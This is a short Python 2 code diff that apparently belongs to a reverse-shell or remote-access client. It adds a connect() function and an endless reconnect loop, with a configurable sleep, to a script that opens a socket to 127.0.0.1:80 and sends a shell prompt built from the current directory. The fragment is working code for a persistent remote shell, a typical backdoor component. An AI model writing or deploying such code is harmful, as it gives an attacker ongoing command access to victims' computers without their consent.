@@ -1,3 +1,4 @@
+import sys
 import socket
 import subprocess
 import Queue
@@ -5,12 +6,25 @@ import os
 import threading
 import time
 import shell_commands
+from shell_config import * 
 
 marker = chr(255)
 
-comm_socket = socket.socket()
-comm_socket.connect(("127.0.0.1",80))
-comm_socket.sendall("\n"+os.getcwd()+">"+marker)
+def connect():
+    global comm_socket
+    comm_socket = socket.socket()
+    comm_socket.connect(("127.0.0.1", 80))
+    comm_socket.sendall("\n"+os.getcwd()+">"+marker)
+
+while True:
+    try:
+        connect()
+        print "worked"
+        break
+    except:
+        print "Can't connect! Trying again in " + str(sleeptime) + " seconds..."
+        time.sleep(sleeptime)
+
 
 output_queue = Queue.Queue()
 
